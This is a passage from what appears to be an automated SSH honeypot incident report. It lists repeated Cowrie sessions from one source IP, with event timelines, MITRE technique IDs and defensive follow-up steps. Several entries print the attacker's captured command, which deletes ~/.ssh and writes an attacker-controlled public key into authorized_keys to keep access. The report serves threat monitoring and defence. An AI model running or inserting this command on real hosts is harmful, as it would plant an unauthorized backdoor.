| `2026-05-03 20:06:55` | `cowrie.command.failed` |
| `2026-05-03 20:06:55` | `cowrie.log.closed` |
| `2026-05-03 20:06:55` | `cowrie.session.params` |
| `2026-05-03 20:06:55` | `cowrie.command.input` |
| `2026-05-03 20:06:55` | `cowrie.session.file_download` |
| `2026-05-03 20:06:55` | `cowrie.log.closed` |
| `2026-05-03 20:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2c821d9739e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:06 |
| **Last Seen** | 2026-05-03 20:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:06:57` | `cowrie.session.connect` |
| `2026-05-03 20:06:57` | `cowrie.client.version` |
| `2026-05-03 20:06:57` | `cowrie.client.kex` |
| `2026-05-03 20:06:57` | `cowrie.login.success` |
| `2026-05-03 20:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95290af771ae

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:07 |
| **Last Seen** | 2026-05-03 20:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:07:51` | `cowrie.session.connect` |
| `2026-05-03 20:07:51` | `cowrie.client.version` |
| `2026-05-03 20:07:52` | `cowrie.client.kex` |
| `2026-05-03 20:07:52` | `cowrie.login.success` |
| `2026-05-03 20:07:52` | `cowrie.session.params` |
| `2026-05-03 20:07:52` | `cowrie.command.input` |
| `2026-05-03 20:07:52` | `cowrie.command.failed` |
| `2026-05-03 20:07:52` | `cowrie.log.closed` |
| `2026-05-03 20:07:52` | `cowrie.session.params` |
| `2026-05-03 20:07:52` | `cowrie.command.input` |
| `2026-05-03 20:07:52` | `cowrie.session.file_download` |
| `2026-05-03 20:07:52` | `cowrie.log.closed` |
| `2026-05-03 20:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20ea6dbc47bc

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:07 |
| **Last Seen** | 2026-05-03 20:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:07:54` | `cowrie.session.connect` |
| `2026-05-03 20:07:54` | `cowrie.client.version` |
| `2026-05-03 20:07:54` | `cowrie.client.kex` |
| `2026-05-03 20:07:54` | `cowrie.login.success` |
| `2026-05-03 20:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57674407a0a1

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:08 |
| **Last Seen** | 2026-05-03 20:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:08:48` | `cowrie.session.connect` |
| `2026-05-03 20:08:48` | `cowrie.client.version` |
| `2026-05-03 20:08:48` | `cowrie.client.kex` |
| `2026-05-03 20:08:49` | `cowrie.login.success` |
| `2026-05-03 20:08:49` | `cowrie.session.params` |
| `2026-05-03 20:08:49` | `cowrie.command.input` |
| `2026-05-03 20:08:49` | `cowrie.command.failed` |
| `2026-05-03 20:08:49` | `cowrie.log.closed` |
| `2026-05-03 20:08:49` | `cowrie.session.params` |
| `2026-05-03 20:08:49` | `cowrie.command.input` |
| `2026-05-03 20:08:49` | `cowrie.session.file_download` |
| `2026-05-03 20:08:49` | `cowrie.log.closed` |
| `2026-05-03 20:08:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac654dc81d2e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:08 |
| **Last Seen** | 2026-05-03 20:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:08:51` | `cowrie.session.connect` |
| `2026-05-03 20:08:51` | `cowrie.client.version` |
| `2026-05-03 20:08:51` | `cowrie.client.kex` |
| `2026-05-03 20:08:51` | `cowrie.login.success` |
| `2026-05-03 20:08:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6a6be57d2f1

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:09 |
| **Last Seen** | 2026-05-03 20:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:09:46` | `cowrie.session.connect` |
| `2026-05-03 20:09:46` | `cowrie.client.version` |
| `2026-05-03 20:09:46` | `cowrie.client.kex` |
| `2026-05-03 20:09:46` | `cowrie.login.success` |
| `2026-05-03 20:09:46` | `cowrie.session.params` |
| `2026-05-03 20:09:46` | `cowrie.command.input` |
| `2026-05-03 20:09:46` | `cowrie.command.failed` |
| `2026-05-03 20:09:46` | `cowrie.log.closed` |
| `2026-05-03 20:09:47` | `cowrie.session.params` |
| `2026-05-03 20:09:47` | `cowrie.command.input` |
| `2026-05-03 20:09:47` | `cowrie.session.file_download` |
| `2026-05-03 20:09:47` | `cowrie.log.closed` |
| `2026-05-03 20:09:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90aa19afac7b

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:09 |
| **Last Seen** | 2026-05-03 20:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:09:48` | `cowrie.session.connect` |
| `2026-05-03 20:09:48` | `cowrie.client.version` |
| `2026-05-03 20:09:48` | `cowrie.client.kex` |
| `2026-05-03 20:09:48` | `cowrie.login.success` |
| `2026-05-03 20:09:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a2d7ccc06c9

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:11 |
| **Last Seen** | 2026-05-03 20:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:11:40` | `cowrie.session.connect` |
| `2026-05-03 20:11:40` | `cowrie.client.version` |
| `2026-05-03 20:11:40` | `cowrie.client.kex` |
| `2026-05-03 20:11:40` | `cowrie.login.success` |
| `2026-05-03 20:11:40` | `cowrie.session.params` |
| `2026-05-03 20:11:40` | `cowrie.command.input` |
| `2026-05-03 20:11:40` | `cowrie.command.failed` |
| `2026-05-03 20:11:40` | `cowrie.log.closed` |
| `2026-05-03 20:11:40` | `cowrie.session.params` |
| `2026-05-03 20:11:40` | `cowrie.command.input` |
| `2026-05-03 20:11:40` | `cowrie.session.file_download` |
| `2026-05-03 20:11:40` | `cowrie.log.closed` |
| `2026-05-03 20:11:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-848d94f8538d

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:11 |
| **Last Seen** | 2026-05-03 20:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:11:42` | `cowrie.session.connect` |
| `2026-05-03 20:11:42` | `cowrie.client.version` |
| `2026-05-03 20:11:42` | `cowrie.client.kex` |
| `2026-05-03 20:11:42` | `cowrie.login.success` |
| `2026-05-03 20:11:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a3658930dba

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:12 |
| **Last Seen** | 2026-05-03 20:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:12:35` | `cowrie.session.connect` |
| `2026-05-03 20:12:35` | `cowrie.client.version` |
| `2026-05-03 20:12:35` | `cowrie.client.kex` |
| `2026-05-03 20:12:35` | `cowrie.login.success` |
| `2026-05-03 20:12:35` | `cowrie.session.params` |
| `2026-05-03 20:12:35` | `cowrie.command.input` |
| `2026-05-03 20:12:35` | `cowrie.command.failed` |
| `2026-05-03 20:12:35` | `cowrie.log.closed` |
| `2026-05-03 20:12:36` | `cowrie.session.params` |
| `2026-05-03 20:12:36` | `cowrie.command.input` |
| `2026-05-03 20:12:36` | `cowrie.session.file_download` |
| `2026-05-03 20:12:36` | `cowrie.log.closed` |
| `2026-05-03 20:12:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e19e99a161f

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:12 |
| **Last Seen** | 2026-05-03 20:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:12:37` | `cowrie.session.connect` |
| `2026-05-03 20:12:37` | `cowrie.client.version` |
| `2026-05-03 20:12:37` | `cowrie.client.kex` |
| `2026-05-03 20:12:38` | `cowrie.login.success` |
| `2026-05-03 20:12:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3befa4d44d81

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:13 |
| **Last Seen** | 2026-05-03 20:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:13:31` | `cowrie.session.connect` |
| `2026-05-03 20:13:31` | `cowrie.client.version` |
| `2026-05-03 20:13:31` | `cowrie.client.kex` |
| `2026-05-03 20:13:31` | `cowrie.login.success` |
| `2026-05-03 20:13:31` | `cowrie.session.params` |
| `2026-05-03 20:13:31` | `cowrie.command.input` |
| `2026-05-03 20:13:31` | `cowrie.command.failed` |
| `2026-05-03 20:13:31` | `cowrie.log.closed` |
| `2026-05-03 20:13:31` | `cowrie.session.params` |
| `2026-05-03 20:13:31` | `cowrie.command.input` |
| `2026-05-03 20:13:32` | `cowrie.session.file_download` |
| `2026-05-03 20:13:32` | `cowrie.log.closed` |
| `2026-05-03 20:13:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b529d456ba79

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:13 |
| **Last Seen** | 2026-05-03 20:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:13:33` | `cowrie.session.connect` |
| `2026-05-03 20:13:33` | `cowrie.client.version` |
| `2026-05-03 20:13:33` | `cowrie.client.kex` |
| `2026-05-03 20:13:33` | `cowrie.login.success` |
| `2026-05-03 20:13:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bec890cc93e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:14 |
| **Last Seen** | 2026-05-03 20:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:14:28` | `cowrie.session.connect` |
| `2026-05-03 20:14:28` | `cowrie.client.version` |
| `2026-05-03 20:14:29` | `cowrie.client.kex` |
| `2026-05-03 20:14:29` | `cowrie.login.success` |
| `2026-05-03 20:14:29` | `cowrie.session.params` |
| `2026-05-03 20:14:29` | `cowrie.command.input` |
| `2026-05-03 20:14:29` | `cowrie.command.failed` |
| `2026-05-03 20:14:29` | `cowrie.log.closed` |
| `2026-05-03 20:14:29` | `cowrie.session.params` |
| `2026-05-03 20:14:29` | `cowrie.command.input` |
| `2026-05-03 20:14:29` | `cowrie.session.file_download` |
| `2026-05-03 20:14:29` | `cowrie.log.closed` |
| `2026-05-03 20:14:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05eaea870d73

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:14 |
| **Last Seen** | 2026-05-03 20:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:14:31` | `cowrie.session.connect` |
| `2026-05-03 20:14:31` | `cowrie.client.version` |
| `2026-05-03 20:14:31` | `cowrie.client.kex` |
| `2026-05-03 20:14:31` | `cowrie.login.success` |
| `2026-05-03 20:14:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37a4adaa2360

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:15 |
| **Last Seen** | 2026-05-03 20:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:15:28` | `cowrie.session.connect` |
| `2026-05-03 20:15:28` | `cowrie.client.version` |
| `2026-05-03 20:15:28` | `cowrie.client.kex` |
| `2026-05-03 20:15:28` | `cowrie.login.success` |
| `2026-05-03 20:15:28` | `cowrie.session.params` |
| `2026-05-03 20:15:28` | `cowrie.command.input` |
| `2026-05-03 20:15:28` | `cowrie.command.failed` |
| `2026-05-03 20:15:28` | `cowrie.log.closed` |
| `2026-05-03 20:15:29` | `cowrie.session.params` |
| `2026-05-03 20:15:29` | `cowrie.command.input` |
| `2026-05-03 20:15:29` | `cowrie.session.file_download` |
| `2026-05-03 20:15:29` | `cowrie.log.closed` |
| `2026-05-03 20:15:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bed81fd723f

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:15 |
| **Last Seen** | 2026-05-03 20:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:15:30` | `cowrie.session.connect` |
| `2026-05-03 20:15:30` | `cowrie.client.version` |
| `2026-05-03 20:15:30` | `cowrie.client.kex` |
| `2026-05-03 20:15:30` | `cowrie.login.success` |
| `2026-05-03 20:15:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-849ef89286f6

| Field | Detail |
